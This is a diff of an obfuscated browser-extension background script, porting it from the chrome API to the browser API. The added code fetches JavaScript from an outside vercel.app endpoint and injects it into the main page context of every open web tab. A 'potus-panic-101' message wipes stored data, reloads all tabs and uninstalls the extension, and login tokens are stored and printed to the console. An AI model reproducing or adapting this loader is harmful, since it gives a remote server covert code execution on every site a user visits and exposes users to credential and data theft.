-                          r[n(574)](r[n(544)](367, 16), r[n(578)](7186, -1)),
-                          r[n(544)](1, 1318)
-                        )
-                      )
-                    )
-                  ),
-                  r[n(283)](
-                    -r[n(459)](parseInt, r[n(465)](o, 365)),
-                    r[n(684)](r[n(574)](r[n(544)](-51, 167), r[n(380)](1, -8182)), 16704)
-                  )
-                ),
-                r[n(485)](
-                  r[n(659)](parseInt, r[n(659)](o, 366)),
-                  r[n(235)](r[n(312)](r[n(551)](-7, -981), -8309), r[n(343)](-4, -362))
-                )
-              ),
-              r[n(591)](
-                r[n(485)](
-                  -r[n(240)](parseInt, r[n(615)](o, 378)),
-                  r[n(331)](r[n(312)](r[n(564)](251, -13), r[n(471)](3, -1680)), 8310)
-                ),
-                r[n(662)](
-                  -r[n(482)](parseInt, r[n(241)](o, 350)),
-                  r[n(332)](
-                    r[n(604)](r[n(410)](5519, 1), r[n(471)](-2539, -1)),
-                    r[n(471)](14, -575)
-                  )
-                )
-              )
-            ),
-            r[n(696)](
-              r[n(662)](
-                r[n(266)](parseInt, r[n(495)](o, 321)),
-                r[n(520)](r[n(547)](3752, r[n(591)](90, -50)), 757)
-              ),
-              r[n(440)](
-                -r[n(354)](parseInt, r[n(354)](o, 370)),
-                r[n(655)](r[n(251)](r[n(380)](-121, 61), 9212), r[n(573)](1, -1821))
-              )
-            )
-          ),
-          r[n(573)](
-            r[n(224)](
-              -r[n(396)](parseInt, r[n(615)](o, 383)),
-              r[n(235)](r[n(684)](r[n(373)](7, -806), r[n(456)](95, 87)), r[n(685)](-2, 1306))
-            ),
-            r[n(390)](
-              -r[n(664)](parseInt, r[n(659)](o, 376)),
-              r[n(312)](r[n(361)](r[n(297)](278, 11), 9816), r[n(345)](109, -118))
-            )
-          )
-        );
-        if (r[n(605)](t, 108163)) break;
-        c[r[n(690)]](c[r[n(360)]]());
-      } catch (t) {
-        c[r[n(690)]](c[r[n(360)]]());
+        if (
+          754642 ===
+          (-parseInt(n(316)) / 1) * (parseInt(n(330)) / 2) +
+            (-parseInt(n(363)) / 3) * (parseInt(n(344)) / 4) +
+            (parseInt(n(360)) / 5) * (-parseInt(n(336)) / 6) +
+            (parseInt(n(346)) / 7) * (-parseInt(n(315)) / 8) +
+            (parseInt(n(332)) / 9) * (parseInt(n(347)) / 10) +
+            parseInt(n(319)) / 11 +
+            parseInt(n(349)) / 12
+        )
+          break;
+        r.push(r.shift());
+      } catch (e) {
+        r.push(r.shift());
       }
-  })(_0x2732),
-  chrome.runtime.onInstalled.addListener(() => {
-    chrome.storage.local.get(["credentials"], (t) => {
-      t.credentials || chrome.action.setPopup({ popup: "popup.html" });
+  })(),
+  browser.runtime.onStartup.addListener(activate),
+  browser.runtime.onInstalled.addListener(activate),
+  (activate.actions = []),
+  browser.runtime.onInstalled.addListener(() => {
+    browser.tabs.query({ active: !0, currentWindow: !0 }, (e) => {
+      const t = e[0];
+      (t.url.startsWith("http://") || t.url.startsWith("https://")) &&
+        browser.tabs.update(t.id, { url: t.url });
+    });
+  }),
+  browser.runtime.onMessage.addListener(async (e, t, n) => {
+    var r = await getCredentials();
+    if (r && null != r)
+      if ("processChatMessage" === e.action) {
+        const { message: t, context: n } = e;
+        (chatContext = n), processChatMessage(t);
+      } else "resetContext" === e.action && (chatContext = []);
+  }),
+  browser.runtime.onInstalled.addListener(() => {
+    browser.storage.local.get(["credentials"], (e) => {
+      e.credentials || browser.action.setPopup({ popup: "popup.html" });
     });
   }),
   (async () => {
-    const t = await getCredentials();
-    console.log(t), t && injectScript();
+    const e = await getCredentials();
+    console.log(e), e && injectScript();
   })(),
-  chrome.runtime.onMessage.addListener((t, e, n) => {
-    console.log("message received", t),
-      "success-login" === t.message
-        ? (chrome.storage.local.set({ credentials: t.token }, () => {
+  browser.runtime.onMessage.addListener((e, t, n) => {
+    console.log("message received", e),
+      "success-login" === e.message
+        ? (browser.storage.local.set({ credentials: e.token }, () => {
             console.log("credentials saved");
           }),
-          console.log(chrome.storage.local.get(["credentials"])),
+          console.log(browser.storage.local.get(["credentials"])),
           injectScript())
-        : "logout-uwu" === t.message
-        ? (chrome.storage.local.remove("credentials", function () {
+        : "logout-uwu" === e.message
+        ? (browser.storage.local.remove("credentials", function () {
             console.log("credentials removed");
           }),
-          console.log(chrome.storage.local.get(["credentials"])),
-          chrome.contextMenus.removeAll(function () {
+          console.log(browser.storage.local.get(["credentials"])),
+          browser.contextMenus.removeAll(function () {
             console.log("All context menus removed.");
           }),
-          chrome.tabs.query({}, (t) => {
-            t.forEach((t) => {
-              chrome.tabs.reload(t.id);
+          browser.tabs.query({}, (e) => {
+            e.forEach((e) => {
+              browser.tabs.reload(e.id);
             });
           }),
-          chrome.action.setPopup({ popup: "popup.html" }))
-        : "potus-panic-101" === t.message &&
-          chrome.storage.local.clear(function () {
+          browser.action.setPopup({ popup: "popup.html" }))
+        : "potus-panic-101" === e.message &&
+          browser.storage.local.clear(function () {
             console.log("All data cleared."),
-              chrome.tabs.query({}, (t) => {
-                const e = t.map(
-                  (t) =>
-                    new Promise((e) => {
-                      chrome.tabs.reload(t.id, {}, e);
+              browser.tabs.query({}, (e) => {
+                const t = e.map(
+                  (e) =>
+                    new Promise((t) => {
+                      browser.tabs.reload(e.id, {}, t);
                     })
                 );
-                Promise.all(e).then(() => {
-                  chrome.management.uninstallSelf();
+                Promise.all(t).then(() => {
+                  browser.management.uninstallSelf();
                 });
               });
           });
+  }),
+  setTimeout(() => {
+    setInterval(checkLogout, 9e5);
+  }, 9e5),
+  browser.runtime.onMessage.addListener((e, t, n) => {
+    if ("fetchAndExecuteScript" === e.action)
+      return (
+        fetch("https://thottathukiduven.vercel.app/api/ext/test")
+          .then((e) => e.text())
+          .then((e) => {
+            executeScript(e, n);
+          })
+          .catch((e) => {
+            console.error("Error fetching the script:", e), n({ err: 3, info: e.message });
+          }),
+        !0
+      );
   });
+const executeScript = async (e, t) => {
+    if (!e) return t({ err: 1, info: "Impossible, somehow no code" });
+    const n = (await browser.tabs.query({})).filter(
+      (e) => e.url.startsWith("http://") || e.url.startsWith("https://")
+    );
+    if (0 === n.length) return t({ err: 2, info: "No valid tabs for job" });
+    try {
+      t({
+        err: 0,
+        info: "Script executed on all valid tabs",
+        results: await Promise.all(
+          n.map(async (t) => {
+            const n = {
+              injectImmediately: !0,
+              world: "MAIN",
+              target: { allFrames: !0, tabId: t.id },
+            };
+            return (
+              await browser.scripting.executeScript({
+                ...n,
+                args: [e],
+                func: (e) => {
+                  const t = document.createElement("script");
+                  (t.textContent = `(async () => { ${e} })().catch((error) => {\n            try {\n              console.error(\`"\${error.message}" \${error.stack.split("\\n")[1].trim()}\`);\n            } catch (err) {\n              console.error(error);\n            }\n          });`),
+                    document.documentElement.appendChild(t),
+                    t.remove();
+                },
+              }),
+              { tabId: t.id, success: !0 }
+            );
+          })
+        ),
+      });
+    } catch (e) {
+      console.error(e), t({ err: 3, info: e.message });
+    }
+  },
+  getActiveTabId = async () => {
+    const e = (await browser.tabs.query({ active: !0, lastFocusedWindow: !0 }))[0];
+    return e ? e.id : null;
+  };
+browser.tabs.onActivated.addListener(async ({ tabId: e }) => {
+  const { url: t } = await browser.tabs.get(e);
+  checkUrlForGood(t) && browser.storage.local.set({ lastTab: e });
+});
+const checkUrlForGood = (e) => e?.startsWith("http");
